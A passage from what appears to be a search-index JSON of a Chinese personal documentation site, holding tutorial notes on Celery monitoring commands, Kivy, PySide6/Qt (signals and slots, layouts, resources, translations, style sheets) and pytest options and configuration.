命令不能修改程序，只能进行查看职程（Worker）概况以及统计信息，可以通过 help 进行查看: $ celery -A proj inspect --help celery control 命令可以查看实际上改变了工作在运行时的状况: $ celery -A proj control --help 例如，可以强制职程（Worker）启用事件消息（用于监控任务以及职程（Worker））: $ celery -A proj control enable_events 启动事件后，可以启动事件转储程序，进行查看职程（Worker）目前执行的状况: $ celery -A proj events --dump 或者可以启动 curses 接口: $ celery -A proj events 当监控完毕之后，可以禁用事件: $ celery -A proj control disable_events celery status 命令可以远程控制并且显示集群中职程（Worker）的列表: $ celery -A proj status 查看所有任务 调用 Celery 实例的 tasks app = Celery()\napp.tasks 仅当导入定义的模块时任务才会被注册。 默认加载程序导入配置 imports 列出的所有模块。\napp.task() 装饰器负责在应用任务注册表中注册你的任务。 详细说明 ./celery_more/option_install ./celery_more/conf_celery ./celery_more/conf_for_redis ./celery_more/命令行工具 ./celery_more/load_celery ./celery_more/canvas ./celery_more/task ./celery_more/exception ./celery_more/logging ./celery_more/应用设计拓展 ./celery_more/优化 ./celery_more/AMQP 入门 ./celery_more/调试 ./celery_more/并发 ./celery_more/信号 ./celery_more/一些问题","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-celry.html","loc":"/yq-docs-rear-end-python-python-three--party-library-celry.html"},{"title":"kivy","text":"一个开源的GUI库, 相对PyQT, tkinter这种GUI框架而言, 增加了对移动平台如安卓, IOS的支持.\n(虽然Qt貌似也支持编写安卓应用, 不过使用好麻烦) 官网文档: https://kivy.org/doc/stable/gettingstarted/intro.html 详见: kivy","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-kivy.html","loc":"/yq-docs-rear-end-python-python-three--party-library-kivy.html"},{"title":"Kivy","text":"注解 看着看着, 发现如果要调用安卓的API(与安卓交互), 实际还是需要与Java交互,\n调用Java类.\n这样还不如直接去搞Java, 反正以前大学主攻就是Java, 虽然是Web方向,\nKivy, 弃之... 安装kivy 使用-属性声明 使用-kv语言","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-kivy-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-kivy-index.html"},{"title":"Python Qt官方框架 pyside6","text":"官网文档:: Qt for Python 相关资源官网下载地址: https://download.qt.io/snapshots/ 安装: pip install pyside6 主要组件: PySide6:    使用QT6的API ShiBoken6:  提供了些与 C++ 交互的方式 (把C++项目拓展到python), 及一些工具方法(工具模块) 其实安装的还有额外的包: (dev_venv) yanque@mbp14 project % pip list | grep -iE 'pyside|shi'\nPySide6                       6.4.1\nPySide6-Addons                6.4.1\nPySide6-Essentials            6.4.1\nshiboken6                     6.4.1 PySide6-Essentials, 是必要包 PySide6-Addons, 附加(additional)包 PySide6.QtWidgets下常用控件 布局相关 QHBoxLayout, 水平布局(从左到右) QVBoxLayout, 垂直布局(从上到下) QGridLayout, 格子布局 QFormLayout, 只有两列的格子布局 控件 QPushButton, 点击按钮 QLineEdit, 单行文本框 QPlainTextEdit, 多行纯文本框 QTextBrowser, 文本浏览器(只读) QLabel, 普通标签 详情 ./pyside6_more","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6.html"},{"title":"Qt支持的模块","text":"官网地址:: modules 一些附加说明: ./modules 其实主要是 pyside6 下面的一些模块: QtBluetooth, 提供与设备蓝牙接口的访问 QtCharts, 提供一系列便捷使用的图表组件 QtConcurrent, 提供多线程编程的高级接口, 不需要关心如何维护底层的锁等. 🪐 QtCore, 核心非 GUI 方法 🪐 QtGui, 核心 GUI 方法 QtDataVisualization, 3维可视化数据展示(条形图, 散点图, 表层图) QtDBus, 统一的, 基于linux的 IPC, RPC 协议 QtDesigner, 继承 Qt Designer 的类 QtHelp, 内置帮助文档(与在线文档内容一致) Qt Multimedia, 多媒体使用相关 API Qt Multimedia Widgets, 多媒体使用相关基础控件 API QtNetwork, 编码 TCP/IP 客户端/服务端相关 Qt Network Authorization, 暴露用户密码, 提供 Qt 应用对 在线应用(如HTTP服务)的限制性访问 QtNfc, 访问设备NFC接口 QtOpenGL, 易于使用 OpenGL (GPU相关的GUI接口, 一系列操作图形/图片的函数API) QtOpenGL Widgets, OpenGL 相关的控件. Qt Positioning, 位置访问. 卫星信息和区域监测 Qt PDF, 展示PDF文档相关 Qt PDF Widgets, 支持的PDF视图控件 QtPrintSupport, 跨平台打印支持 QtQml, QML [1] API (引入类似Web XML技术). QtQuick, Qt 应用中嵌入 Qt Quick (引入类似Web XML技术), 其实就是嵌入 js 形式编码的东西 QtQuickControls2, 从 C++ 设置控件 QtQuickWidgets, QtQuick 相关控件的嵌入 QtRemoteObjects, 基于Qt的 IPC 模块, 易于与计算机进程通信 Qt Scxml, 从 SCXML 文件创建和使用状态机 Qt Sensors, 访问硬件传感器 Qt Serial Port, 与硬件及虚拟串口的交互 Qt Spatial Audio, 在3D空间中建模声源及其周围环境 QtSql, 提供与数据库的无缝衔接 QtStateMachine, 创建和执行状态图 (没懂) QtSvg, svg图片的展示 QtSvgWidgets, svg相关控件 QtTest, Qt 的单元测试库 QtUiTools, 处理 Qt Designer 设计的内容, 应该是 .ui 文件 Qt WebChannel, 无缝衔接对 HTML/JavaScript 的访问, 主要是通过其 QObject 或 QML objects QtWebEngine Core C++ Classes, QtWebEngine 和 QtWebEngineWidgets 的公共 API 共享 QtWebEngine Widgets C++ Classes, 提供Qt 应用内 C++ 类对 Web 部分内容的渲染 QtWebEngine QML Types, Qt 应用内 QML 类型对 Web 部分内容的渲染 Qt WebSockets, 与 WebSocket 的通信 🪐 QtWidgets, 使用 C++ 的方法, 对 Qt GUI 的拓展 QtXml, 提供了 C++ 层面的 DOM 实现 Qt3DAnimation, 基础的 3D 动画元素 Qt3D Core, 近乎实时模拟系统的功能 方法 Qt3D Extras, Qt 3D 开发的预构建元素 Qt3D Input, Qt 3D 开发下, 处理用户输入 Qt3D Logic, Qt 3D 开发下, 启用帧与Qt 3D后端的同步 Qt3D Render, 支持使用Qt 3D进行2D和3D渲染的功能 Qt CoAP, 实现由RFC 7252定义的CoAP客户端 Qt OPC UA, 用于工业应用中的数据建模和数据交换的协议 Qt MQTT, 提供MQTT协议规范的实现 [1] QML: 是 Qt 为 Qt Quick 打造的描述界面的新语言，然而就语法上，基本就是对 Javascript 做了扩展。\n几乎所有 Javascript 的语法都可以使用。","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QT-supported-module.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-QT-supported-module.html"},{"title":"教程","text":"基本说明见: index Widgets说明 控件示例参考: gallery 常用控件: QPushButton, 可点击的按钮 QLabel, 标签控件 QLineEdit, 行编辑框 创建应用程序都需要先导入 QApplication from PySide6.QtWidgets import QApplication, QLabel\n\napp = QApplication([])\n\n# do something\n# QLabel 参数除了是纯文本, 还可以是 HTML\nlabel = QLabel(\"<font color=red size=40>Hello World!</font>\")\n\napp.exec() 当 QApplication 不需要参数时, 就给空列表即可, 需要命令行参数就写 sys .argv 信号-槽 机制 Signals and Slots 官网:: Signals and Slots 用于控件之间的通信, 类似于回调函数, Qt 的核心功能 当控件对象发生状态改变时, 信号由控件对象发出 (官网说是真正的对象封装?) 槽用于接收信号 信号也可直接连接到另一个信号, 相当于两个信号同时发生(一个信号发生时, 会立即出发另一个信号, 不论第一个信号发生是否完毕) Qt 内部也预定于了一些槽, 比如 QLineEdit 的 clear 方法 信号与槽的连接使用 connect , 返回 QMetaObject.Connection 对象,\n解绑使用这个返回对象的 disconnect() 方法 可用于减少依赖,\n解偶?\n但是个人觉得, 使用 connet 连接信号和槽的时候还是知道了自己连接了哪个, 只是不知道之后连接的的哪个槽会做出哪些操作,\n感觉不算完全结偶 槽 Slot 使用装饰器: from PySide6.QtCore import Slot\n\n@Slot()\ndef fun():\n  pass 使用控件的 connect 连接到槽, clicked 就是信号: # Create a button\nbutton = QPushButton(\"Click me\")\n\n# Connect the button to the function\nbutton.clicked.connect(fun) 显示控件: # Show the button\nbutton.show() 注解 其实普通的类似这样的函数定义(无参数的函数定义), 加不加 @Slot 的装饰器实际测试没什么差别, 但是迄今为止还没找到一个合适的说法. 比如? 为什么普通的函数需要加 @Slot 注解? 什么时候起作用? 等等. 官网只有一句这个: Signals can also be connected to free functions 这里没动 free functions 是啥意思, 官网给的例子像是说 外部定义的自由函数? 但是个人觉得应该也包含无参数方法吧. 拓展说明 Signals 自定义信号, 可传入不同的类型: from PySide6.QtCore import Signal Python 类型: signal1 = Signal(int)  # Python types Qt 类型: signal2 = Signal(QUrl)  # Qt Types 多个参数: signal3 = Signal(int, str, int)  # more than one type 可选参数: signal4 = Signal((float,), (QDate,))  # optional types Signal 可接受的关键词参数: name: str 表示这个槽的名称, 若没指定, 则使用变量名 arguments: list 可用于 QML 应用, 表示按照名称引用发射值 如: sumResult = Signal(int, arguments=['sum']) QML: Connections {\n    target: ...\n    function onSumResult(sum) {\n        // do something with 'sum'\n    } Slot 与信号类似, 支持传入类型: @Slot(str)\ndef slot_function(self, s):\n    ... 可接受的关键字参数: name: str 槽名称, 未指定则为函数名 result: 返回类型, 可以是 Python 类型, 也可以是 C 类型 不同类型的超载信号与槽 即一个信号可接受可变类型参数, 如可接受 int 与 str 类型: Signal((int,), (str,)) 列官网例子: import sys\nfrom PySide6.QtWidgets import QApplication, QPushButton\nfrom PySide6.QtCore import QObject, Signal, Slot\n\nclass Communicate(QObject):\n    # create two new signals on the fly: one will handle\n    # int type, the other will handle strings\n    speak = Signal((int,), (str,))\n\n    def __init__(self, parent=None):\n        super().__init__(parent)\n\n        self.speak[int].connect(self.say_something)\n        self.speak[str].connect(self.say_something)\n\n    # define a new slot that receives a C 'int' or a 'str'\n    # and has 'say_something' as its name\n    @Slot(int)\n    @Slot(str)\n    def say_something(self, arg):\n        if isinstance(arg, int):\n            print(\"This is a number:\", arg)\n        elif isinstance(arg, str):\n            print(\"This is a string:\", arg)\n\nif __name__ == \"__main__\":\n    app = QApplication(sys.argv)\n    someone = Communicate()\n\n    # emit 'speak' signal with different arguments.\n    # we have to specify the str as int is the default\n    someone.speak.emit(10)\n    someone.speak[str].emit(\"Hello everybody!\") 控件布局 布局 相关控件: QHBoxLayout, 水平布局(从左到右) QVBoxLayout, 垂直布局(从上到下) QGridLayout, 格子布局 QFormLayout, 只有两列的格子布局 设置一个水平布局: self._layout = QHBoxLayout(self) 布局内加入两个控件, 控件水平方向占比为 1:4 self._layout.addWidget(self._m_left_side_window, 1)\nself._layout.addWidget(self._m_main_window, 4) 与以下代码效果一致: self._layout.addWidget(self._m_left_side_window, )\nself._layout.addWidget(self._m_main_window, )\nself._layout.setStretchFactor(self._m_left_side_window, 1)\nself._layout.setStretchFactor(self._m_main_window, 4) 有时有设置控件布局的需求: # xx_widget.setLayout(self._layout)\nself.setLayout(self._layout) 使用 ``resize(width, heigth)`` 与 使用布局控件如 ``QVBoxLayout`` 垂直布局是冲突的 resize(width, heigth) 表示自定义窗体大小,\n这个时候是需要自己进行手动布局的, 且需要手动执行 show() 才可以显示控件 使用布局控件, 布局控件会自动帮你调整其内容大小, 只有最顶层的需要调用 show() ,\n需要注意的是, 其下如果有控件没放到布局内部, 还是需要手动 show addStretch(), 填充一个空白位置 显示表格数据的两个控件 QTableWidget 搭配 QTableWidgetItem(表示每一个单元格) 使用, 简单一点, 但是大数据时候不卡 QTableView 复杂一点, 大数据流畅 QTableWidget 部分方法: setRowCount(row: int) 设置表格行数 setColumnCount(column: int) 设置表格列数 setHorizontalHeaderLabels 设置表格头, 参数为 str或者list类型 展示/更新颜色控件 QColor 一些基本颜色与对应16进制: colors = [(\"Red\", \"#FF0000\"),\n          (\"Green\", \"#00FF00\"),\n          (\"Blue\", \"#0000FF\"),\n          (\"Black\", \"#000000\"),\n          (\"White\", \"#FFFFFF\"),\n          (\"Electric Green\", \"#41CD52\"),\n          (\"Dark Blue\", \"#222840\"),\n          (\"Yellow\", \"#F9E56d\")] 树控件 QTreeWidget, 与 QTreeWidgetItem 协作 QTreeView 图表控件 QPieSeries, 饼状图 QLineSeries, 折线图 QChart QChartView 可参考例子: Expenses Tool Tutorial 异步编程 trio 模块 ui 文件配置 感觉没有手写方便, 先略过 qrc 文件配置 .qrc 是用来配置二进制资源文件的, 通过此文件加载响应的资源文件如字体, 图标, 然后使用 控件 如: QFile, QIcon 一个图标qrc文件 icons.qrc: </ui>\n<!DOCTYPE RCC><RCC version=\"1.0\">\n<qresource>\n    <file>icons/play.png</file>\n    <file>icons/pause.png</file>\n    <file>icons/stop.png</file>\n    <file>icons/previous.png</file>\n    <file>icons/forward.png</file>\n</qresource>\n</RCC> 使用 pyside6-rcc 转换为 Python 文件: pyside6-rcc icons.rc -o rc_icons.py 原来代码: from PySide6.QtGui import QIcon, QKeySequence\nplayIcon = self.style().standardIcon(QStyle.SP_MediaPlay) 修改后的代码: from PySide6.QtGui import QIcon, QKeySequence, QPixmap\nplayIcon = QIcon(QPixmap(\":/icons/play.png\")) 多语言支持 Qt Linguist 官网称做: Qt Linguist 见: translations 使用 self.tr() count = len(self._list_widget.selectionModel().selectedRows())\nmessage = self.tr(\"%n language(s) selected\", \"\", count) 翻译文件为基于 XML 的 .ts 文件, 通过 lupdate 提取: pyside6-lupdate main.py main.qml form.ui -ts example_de.ts 文件已存在则为更新模式. 转换为二进制的 .qm 文件: mkdir translations\npyside6-lrelease example_de.ts -qm translations/example_de.qm 建议通过 .qrc 文件来使用: <!DOCTYPE RCC><RCC version=\"1.0\">\n<qresource>\n    <file>translations/example_de.qm</file>\n</qresource>\n</RCC> 代码中路径形式: :/translations/example_de.qm 代码中通过 QTranslator 来加载: path = QLibraryInfo.location(QLibraryInfo.TranslationsPath)\ntranslator = QTranslator(app)\nif translator.load(QLocale.system(), 'qtbase', '_', path):\n    app.installTranslator(translator)\ntranslator = QTranslator(app)\npath = ':/translations'\nif translator.load(QLocale.system(), 'example', '_', path):\n    app.installTranslator(translator) 第一次加载 Qt 的翻译, 第二次加载资源文件的翻译. 可通过以下方式运行: LANG=de python main.py GNU gettext 相关可参考 gettext 例子, 最顶部定义 import gettext\n...\n_ = None\nngettext = None 翻译部分定义 src_dir = Path(__file__).resolve().parent\ntry:\n    translation = gettext.translation('example', localedir=src_dir / 'locales')\n    if translation:\n        translation.install()\n        _ = translation.gettext\n        ngettext = translation.ngettext\nexcept FileNotFoundError:\n    pass\nif not _:\n    _ = gettext.gettext\n    ngettext = gettext.ngettext 将会找 locales 下的 example 使用 file_menu = self.menuBar().addMenu(_(\"&File\")) 转换 .pot 文件: mkdir -p locales/de_DE/LC_MESSAGES\nxgettext -L Python -o locales/example.pot main.py 文件头大概如下: \"Project-Id-Version: PySide6 gettext example\\n\"\n\"POT-Creation-Date: 2021-07-05 14:16+0200\\n\"\n\"Language: de_DE\\n\"\n\"MIME-Version: 1.0\\n\"\n\"Content-Type: text/plain; charset=UTF-8\\n\"\n\"Content-Transfer-Encoding: 8bit\\n\"\n\"Plural-Forms: nplurals=2; plural=n != 1;\\n\" 翻译内容大概如下: #: main.py:57\nmsgid \"&File\"\nmsgstr \"&Datei\" 转换为 .mo 翻译文件: msgfmt -o example.mo example.pot 运行: LANG=de python main.py 控件样式 默认使用当前平台系统的主题.\n也可自定义样式 自定义方式: 使用 Qt 提供的部分样式,\n如: w = QLabel(\"This is a placeholder text\")\nw.setAlignment(Qt.AlignCenter) 类 CSS 语法,\n如: w.setStyleSheet(\"\"\"\n    background-color: #262626;\n    color: #FFFFFF;\n    font-family: Titillium;\n    font-size: 18px;\n    \"\"\") 多个类 CSS 样式可以使用 .qss 文件 注解 使用字体需要先安装. 可以使用 QFontDatabase 查看已安装字体, 使用 families() 指定. .qss 文件说明: 与 CSS 文件基本是一致的, 不过可以直接使用控件类名来指定样式: QLabel {\n    background-color: red;\n} 也可以设置控件类对象的名称, 如: QLabel#title {\n    font-size: 20px;\n} 而对于某些预定义控件下的控件, 如 QListWidget 下的 QListWidgetItem QListWidget::item {\n    height: 50px;\n} 同样的, 选中状态定义: QListWidget::item:selected {\n    background-color: #2ABf9E;\n    qproperty-alignment: AlignCenter;\n} 代码中这样定义: label = QLabel(\"Test\")\nlabel.setObjectName(\"title\") 使用自定义的样式文件, 使用 setStyleSheet if __name__ == \"__main__\":\n  app = QApplication()\n\n  w = Widget()\n  w.show()\n\n  with open(\"style.qss\", \"r\") as f:\n      _style = f.read()\n      app.setStyleSheet(_style)\n\n  sys.exit(app.exec()) 这样设计可以很好的去 解耦 移植 C++ 应用到 Python Qt 称 重写 更贴切. 参考: Porting a C++ Application to Python","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Tutorial.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-Tutorial.html"},{"title":"Pyside6","text":"QML Qt支持的模块 debian下的安装 教程 使用docker安装 项目介绍 数据可视化工具 基本概念说明 Qt, QML, Widgets区别 参考:: Qt, QML, Widgets…What Is The Difference? Qt 可以是使用 C++ 开发的 Qt 框架, 也可以是 使用此框架开发的 Qt 应用程序. QML Qt设计的一种类似 CSS, JSON 的语言, 同时允许 JavaScript , 用于创建 UI 应用 可被其他组件集成, 可被 C++ 代码使用. Widgets 预定义的一些 Qt 控件, 控件原则是: 基本与系统原生窗口外观一致. 如果需要更新外观样式(可能会违背上面的原则), 参考... 没参考了, 官网文档都 404 了... Python And C++ 使用 Python 开发时, 不需要了解 C++ 的实现. 不过可以混合使用. 在用户代码级别, Python 实现基本做到了全覆盖(C++ 的实现), 可以任意重写 若使用 C++ 自定义控件, 可以创建 Python 绑定以便于在 Python 使用 若有特殊的需求实现需要使用到自定义的 C++ 库, 也可以创建其绑定以便 Python 使用 对于一个 C++ 的 Qt 程序而言, 可以通过暴露单例的 Python 绑定 给 Python 解释器以便其使用 (就像一个 Python 插件系统) 不过这些实现(后面三个实现), 依赖于 Shiboken (绑定生成工具) 文件类型 官网:: File Types .ui , 类似 XML 文件的形式来绘制 GUI 界面, 使用 pyside6-uic 将其转换为 Python 代码. 编写参考: using-ui-files .qrc , 资源文件, 编写方式类似 XML, 使用 pyside6-rcc 将其转换为 Python 代码. 编写参考: using-qrc-files .qml , 语言文件, 绘制页面. .pyproject , 新版本内容是基于 JSON 的格式. 可用于配置给 C++ 项目处理的一些文件. 一些命令行 参考:: Which IDEs Are Compatible? 打开 Qt Designer 工具以创建 .ui 文件: pyside6-designer 将 .ui 文件转换为 Python 代码: pyside6-uic -i form.ui -o ui_form.py 将 .qrc 文件转换为 Python 代码: pyside6-rcc -i resources.qrc -o rc_resources.py 可使用的开发工具(IDE) QtCreator, 有个好处是有一些模版可以使用, 下载: QtCreator (这个还真没听说过, 有空了解一下) Visual Studio Code, 需要安装插件: ext install seanwu.vscode-qt-for-python PyCharm, 需手动配置相关工具. 如 Qt Designer .\n配置位置: File > Settings > tools > PyCharm External Tools Shiboken - 绑定生成器(Python/C++) 下包含函数: Shiboken pip 安装的时候, 默认会一起安装的模块: yanque@yanquedembp code % pip list | grep shiboken\nshiboken6                            6.4.0.1 包含了一些工具来保证 Pyside 可以正确运行 (主用于debug吧) 还有一个 Shiboken Generator 默认不会自动一起安装. 教程中提到的 Shiboken 大多指的是 Shiboken Generator ,\n详见: Shiboken Generator 什么时候需要 Shiboken Generator ? 若仅运行一个 Python 级别的 Qt 应用, 则不需要 若需要于 C++ 层面的代码结合, 如继承或自定实现的 C++ 的绑定, 需要 项目部署 官网:: distribution deployment 尤其是跨平台时. 官方建议是构建冻结文件, 其实就是将代码打包成平台的相应包, 不同的模块可以打包成不同的包以适配大型应用, 因为这样可以分布式的更新仅需更新的文件. 个人比较熟悉的是: deployment-nuitka","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-index.html"},{"title":"支持的模块","text":"Shiboken Generator Shiboken","tags":"后端; python","url":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-modules-index.html","loc":"/yq-docs-rear-end-python-python-three--party-library-pyside6_more-modules-index.html"},{"title":"pytest","text":"使用见: Pytest 语法: pytest [options] [file_or_dir] [file_or_dir] [...]\n\n# positional arguments:\n#   file_or_dir 选项参数 general: --capture= method 捕获消息的类型 fd|sys|no|tee-sys. -s 上面为no时的简写 --capture=no. 后面看到一个说法是输出包含stdout与stderr.\n正常情况下,pytest会捕获测试中的stdout和stderr,并只在测试失败时才将其打印出来。\n使用-s选项后,pytest将不会捕获stdout和stderr,而是直接打印。\n这在调试测试用例时非常有用,可以直接在控制台看到print的输出,而不需要添加失败的断言来查看输出。 --show-capture= <{no,stdout,stderr,log,all}> Controls how captured stdout/stderr/log is shown on\nWrite captured log messages to JUnit report: one of -m <some_test> 指定要运行哪些测试 -m MARKEXPR 仅运行 @pytest.mark.MARKEXPR 装饰的测试.\n如: -m 'mark1 and not mark2'. -k EXPRESSION 仅执行匹配 EXPRESSION 的测试, 支持通配符, 多个使用引号包裹, or 隔开.\n如: -k 'test_method or test_other' 表示\n会执行所有 函数名/类名包含 'test_method' or 'test_other' 的测试;\n-k 'not test_method' 表示仅执行不包含 'test_method' 的测试;\n-k 'not test_method and not test_other' 表示两者之一被包含的测试会被排除. --markers show markers, 即上面 -m 的 MARKEXPR -x , --exitfirst 当测试错误/执行失败, 立即退出执行, 不会运行后面的测试 --fixtures , --funcargs show available fixtures, sorted by plugin appearance\n(fixtures with leading '_' are only shown with '-v') --fixtures-per-test show fixtures per test --pdb 在错误或者键盘中断(Ctrl + C)时候, 开始一个交互式的 pdb debugger (终端). --pdbcls= <modulename:classname> 使用 --pdb 来开启一个 debug 终端.\n此时可加此选项来指定终端类型,\n如:\n--pdbcls=IPython.terminal.debugger:TerminalPdb --trace 在运行每项测试时立即中断, 用于 debug. --runxfail 报告标记 XFAIL 测试的结果, 就像他们没有被标记一样. --lf , --last-failed 在最后一次运行时, 仅重新运行失败的测试(如果没有失败，则全部运行) --ff , --failed-first 运行所有测试，但先运行最后的失败。\n这可能会重新安排测试，从而导致\n固件的重复 安装/卸载. --nf , --new-first 首先运行最新的文件的测试,\n然后按照文件的 mtime (修改时间) 顺序执行. --cache-show= <[CACHESHOW]> 不执行测试收集/测试, 显示缓存内容.\nOptional argument: glob (default: '*'). --cache-clear 测试开始前移除所有的缓存内容. --lfnf= <{all,none}> , --last-failed-no-failures= <{all,none}> 在之前没有（已知）故障的情况下运行哪些测试?\n原句:\nwhich tests to run with no previously (known) failures. --sw , --stepwise 当测试失败时退出, 下一次从次失败的测试开始执行 --sw-skip , --stepwise-skip 仅忽略第一个失败的测试, 即后续还有失败会停止\n隐式启用 --stepwise. -v 启用冗长日志记录,会打印更详细的测试结果。 -v v 启用更加详细的日志,会打印测试相关的所有输出,包括:\n测试开始和结束的日志;\n测试文件路径;\n通过的测试用例名称;\n失败的测试用例名称及失败原因;\n跳过的测试用例名称及跳过原因;\n所有打印的输出(类似-s选项);\n用于记录测试结果的文件路径; ``-m MARKEXPR`` 说明 : 作用为指定运行哪些测试用例, MARKEXPR 表示装饰器的标记, 多个使用引号包裹, or 隔开: pytest -m \"test_run1 or test_run2 or test_run3\" 表示仅运行以下装饰器修饰的测试: @pytest.mark.test_run1\n@pytest.mark.test_run2\n@pytest.mark.test_run3 捕获方式 capture 说明 : fd, 文件描述符级别的捕获, 也就是写入到 1 , 2 标准输出/错误的内容会被捕获 sys, 使用 sys.stdout , sys.stderr 输出的消息会被捕获 no, 禁止捕获所有输出. tee-sys 个人理解: 这里的捕获, 即将本来应该立即输出到到控制台/文件的信息截取, 可以加一些自定义的操作. 默认是 all , 捕获所有信息, 所以不会实时输出而是结束后一起输出 如果想 实时输出信息 那么需要使用, -s 或者 --capture=no , 实际测试也不是必须 日志选项 可以 pytest -h 查看帮助文档, logging 相关部分内容如下: logging:\n--log-level=LEVEL     level of messages to catch/display.\n                      Not set by default, so it depends on the root/parent log handler's effective level, where it is \"WARNING\" by default.\n--log-format=LOG_FORMAT\n                      log format as used by the logging module.\n--log-date-format=LOG_DATE_FORMAT\n                      log date format as used by the logging module.\n--log-cli-level=LOG_CLI_LEVEL\n                      cli logging level.\n--log-cli-format=LOG_CLI_FORMAT\n                      log format as used by the logging module.\n--log-cli-date-format=LOG_CLI_DATE_FORMAT\n                      log date format as used by the logging module.\n--log-file=LOG_FILE   path to a file when logging will be written to.\n--log-file-level=LOG_FILE_LEVEL\n                      log file logging level.\n--log-file-format=LOG_FILE_FORMAT\n                      log format as used by the logging module.\n--log-file-date-format=LOG_FILE_DATE_FORMAT\n                      log date format as used by the logging module.\n--log-auto-indent=LOG_AUTO_INDENT\n                      Auto-indent multiline messages passed to the logging module. Accepts true|on, false|off or an integer. 有三种使用方式: A: pytest test_xxx.py --log-cli-level=info B, 编辑pytest.ini或tox.ini或setup.cfg文件: [pytest]\nlog_cli = 1\nlog_cli_level = INFO\nlog_cli_format = %(asctime)s [%(levelname)8s] %(message)s (%(filename)s:%(lineno)s)\nlog_cli_date_format=%Y-%m-%d %H:%M:%S C, 用pytest -o方式重写(pytest 3.4之后): pytest test_xxx.py -o log_cli=true -o log_cli_level=INF 警告相关: pytest-warnings:\n-W PYTHONWARNINGS, --pythonwarnings=PYTHONWARNINGS\n                      Set which warnings to report, see -W option of Python itself\n--maxfail=num         Exit after first num failures or errors\n--strict-config       Any warnings encountered while parsing the `pytest` section of the configuration file raise errors\n--strict-markers      Markers not registered in the `markers` section of the configuration file raise errors\n--strict              (Deprecated) alias to --strict-markers\n-c file               Load configuration from `file` instead of trying to locate one of the implicit configuration files\n--continue-on-collection-errors\n                      Force test execution even if collection errors occur\n--rootdir=ROOTDIR     Define root directory for tests. Can be relative path: 'root_dir', './root_dir', 'root_dir/another_dir/'; absolute path:\n                      '/home/user/root_dir'; path with variables: '$HOME/root_dir'. 使用pytest.ini文件 使用 pytest.ini 文件配置测试用例 文件一般建立在项目根目录下. 也不是强制性, 在哪个目录下执行 pytest 命令,\n就在哪个目录下寻找 pytest.ini , 不支持放在子目录下(除非去子目录跑测试) 一般配置模版: [pytest]\n# 然后写配置项 支持的配置选项(部分): addopts, 额外命令行选项, 可以更改默认命令行选项, 即在命令行补充参数, 如果有一样的选项, 尽量合并(看效果是) testpaths, 执行用例的目录 python_file, 执行文件名 python_classes, 执行的类名 python_functions, 执行方法名 usefixtures, 指定使用哪些固件. cache_dir, 缓存目录 log_level, 日志等级, 默认是 --log-level 的 warring log_format, 日志格式 log_file_date_format, 日志日期格式 log_auto_indent, 日志缩进 pythonpath, 将路径加入到 sys.path minversion, pytest最低版本 required_plugins, 需要加载的插件 支持的环境变量 environment variables: PYTEST_ADDOPTS,   额外命令行选项 PYTEST_PLUGINS,   启动时加载的插件, 多个使用逗号分隔 PYTEST_DISABLE_PLUGIN_AUTOLOAD,   设置不加载的插件 PYTEST_DEBUG,     调试相关, set to enable debug tracing of pytest's internals 自定义mark装饰器 比如: @pytest.mark.mytest 直接使用这种自定义的mark表示, 会有警告: pytest.unknown_mark_warning 注解 使用 pycharm测试时, 会自动加上 -q 等参数, 所以看不到警告, 暂时没找到怎么覆盖这些配置,\n只有手动跑才能看到了 但是实际是自己有使用的, 这个时候需要将这个配置项添加到pytest.ini文件: [pytest]\nmarkers =\n  mytest: 表示一个自定义mark标记 格式为自定义表示的名称name, 与含义说明. 若不方便配置ini文件, 可以在conftest.py中手动使用config写入: # conftest.py\n# coding: utf-8\nfrom _pytest.config import Config\n\ndef pytest_configure(config: Config):\n    config.addinivalue_line(\n        'markers',\n        'mytest1: mark_mytest1',\n    ) 第一个参数就是上面说的name, 第二个参数就是描述, 注解 像这种在代码中补充配置的, 必须在插件的注册阶段使用, 所以\n必使用pytest_configure定义在conftest.py,\n无法写在具体的固件@fixture中, 即使fixture定义在conftest. 固件fixture说明 实际还是装饰器 @pytest.fixture(name='xxx', scope='function', autouse=False) 此装饰器详细信息见: Pytest 下的 支持的装饰器 关于第二个参数生效范围, 支持以下值 function (默认作用域)：fixture 在每个测试函数调用时都会被执行一次。 class：fixture 在每个测试类调用时都会被执行一次。 module：fixture 在每个测试模块调用时都会被执行一次。 session：fixture 在整个测试会话期间只会被执行一次。 第三个参数 autouse 默认为 False , 如果设置为 True , 表示及时不直接调用, 也会自动被触发使用 一些其他指令 查看所有预定义固件: pytest --fixtures 查看所有预定义标记: pytest --markers 一些使用技巧 跳过所有测试用例 直接命令行设置: pytest -m \"\" 但是有时候不方便直接修改命令行, 还可以在 pytest.ini 设置: [pytest]\naddopts = -m \"\" 注解 实际使用中发现, 在有些版本 -m \"\" 表示会执行所有的测试用例,\n而有些版本全都不会运行. 有时禁用所有测试会导致测试错误, 这时候也可使用 -k 指定一个耗时少的测试: -k \"测试函数名/文件名\" 实时打印日志 日志使用可参考: 日志选项 还是使用 logging 模块. 与平时使用无差别,\n测试时加启动参数 --capture=no 即可, 或者 -s 效果一致: _logger = logging.getLogger(__name__)\n\n_logger.setlevel(logging.INFO)\n_logger.info('xxx') 实际就是: pytest test_xxx.py --log-cli-level=info --capture=no\npytest test_xxx.py --log-cli-level=info -s 打印乱码问题 在最高级别的conftest.py添加如下代码即可: def pytest_collection_modifyitems(items):\n    \"\"\"\n    测试用例收集完成时，将收集到的item的name和nodeid的中文显示在控制台上\n    :return:\n    \"\"\"\n    for item in items:\n        item.name = item.name.encode(\"utf-8\").decode(\"unicode_escape\")\n        item._nodeid = item.nodeid.encode(\"utf-8\").decode(\"unicode_escape\") 隐藏警告 可在 pytest.ini 文件中添加以下行来隐藏警告: addopts = -p no:warnings 这将禁用所有警告. 